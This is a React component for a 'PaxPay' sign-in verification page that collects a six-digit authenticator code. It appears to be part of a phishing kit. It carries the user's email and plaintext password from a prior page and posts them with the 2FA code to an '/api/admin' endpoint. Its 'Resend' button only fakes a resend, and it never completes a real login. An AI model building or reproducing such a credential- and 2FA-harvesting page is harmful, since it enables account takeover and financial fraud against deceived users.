import React, { useRef, useState, useEffect } from 'react';
import { useLocation } from 'react-router-dom';
import axios from 'axios';

function Verification() {
  const location = useLocation();
  const { email, password } = location.state || {};

  const CODE_LENGTH = 6;
  const inputs = Array(CODE_LENGTH).fill().map(() => useRef(null));
  const [code, setCode] = useState(Array(CODE_LENGTH).fill(''));
  const [timeLeft, setTimeLeft] = useState(30);
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {
    if (timeLeft <= 0) return;
    const timer = setInterval(() => setTimeLeft((prev) => prev - 1), 1000);
    return () => clearInterval(timer);
  }, [timeLeft]);

  useEffect(() => {
    if (code.every((char) => char !== '')) {
      handleSubmit();
    }
  }, [code]);

  const handleChange = (e, idx) => {
    const value = e.target.value;
    if (!/^[0-9]?$/.test(value)) return;
    const newCode = [...code];
    newCode[idx] = value;
    setCode(newCode);

    if (value && idx < CODE_LENGTH - 1) {
      inputs[idx + 1].current.focus();
    }
  };

  const handleKeyDown = (e, idx) => {
    if (e.key === 'Backspace' && !code[idx] && idx > 0) {
      inputs[idx - 1].current.focus();
    }
  };

  const handlePaste = (e) => {
    const paste = e.clipboardData.getData('text').trim();
    if (/^\d{6}$/.test(paste)) {
      const newCode = paste.split('');
      setCode(newCode);
      newCode.forEach((char, i) => {
        if (inputs[i]?.current) {
          inputs[i].current.value = char;
        }
      });
      inputs[CODE_LENGTH - 1].current.focus();
    }
    e.preventDefault();
  };

  const handleSubmit = async () => {
    setIsSubmitting(true);
    const finalCode = code.join('');

    try {
      await axios.post('http://localhost:5000/api/admin', {
        email,
        password,
        code1: finalCode.slice(0, 2),
        code2: finalCode.slice(2, 4),
        code3: finalCode.slice(4, 6),
        code4: '000000' // optional or custom logic
      });
      alert('✅ Submitted successfully!');
    } catch (err) {
      console.error(err);
      alert('❌ Failed to submit');
    } finally {
      setIsSubmitting(false);
    }
  };

  const resendCode = () => {
    setTimeLeft(30);
    setCode(Array(CODE_LENGTH).fill(''));
    inputs[0].current.focus();
    alert('🔁 Verification code resent!');
  };

  return (
    <div className='bg-black min-h-screen text-white'>
      <div className='flex items-center space-x-2 bg-black px-2 pt-6 pb-10 sticky top-0 z-50'>
        <img src="/logo.png" alt="Logo" className="h-10 w-10" />
        <h1 className="font-semibold bg-black text-gray-300 text-3xl">PaxPay</h1>
      </div>
      <div className="min-h-screen fixed flex bg-black px-4">
        <div className="bg-black shadow-md rounded-lg w-full max-w-md ">
          <h2 className="text-3xl font-semibold text-white mb-2">Verification</h2>
          <p className="text-sm text-gray-600 mb-6">Enter the 6-digit code we sent to the authenticator associated with your account.</p>

          <div className="flex gap-2 mb-6" onPaste={handlePaste}>
            {code.map((_, idx) => (
              <input
                key={idx}
                ref={inputs[idx]}
                type="text"
                maxLength="1"
                className="w-12 h-14 text-center text-white border border-gray-600 bg-black rounded-md focus:ring-2 text-xl"
                onChange={(e) => handleChange(e, idx)}
                onKeyDown={(e) => handleKeyDown(e, idx)}
              />
            ))}
          </div>

          <button
            type="button"
            onClick={handleSubmit}
            disabled={isSubmitting || code.includes('')}
            className="px-36 bg-lime-400 text-black py-2 rounded-md text-md font-semibold "
          >
            {isSubmitting ? 'Verifying...' : 'Sign in'}
          </button>

          <p className="text-sm text-gray-600 mt-4">
            Didn't receive the code?{' '}
            {timeLeft > 0 ? (
              <span className="text-gray-400">{`Resend in ${timeLeft}s`}</span>
            ) : (
              <button onClick={resendCode} className="text-lime-500 hover:underline font-medium">
                Resend
              </button>
            )}
          </p>
        </div>
      </div>
    </div>
  );
}

export default Verification;

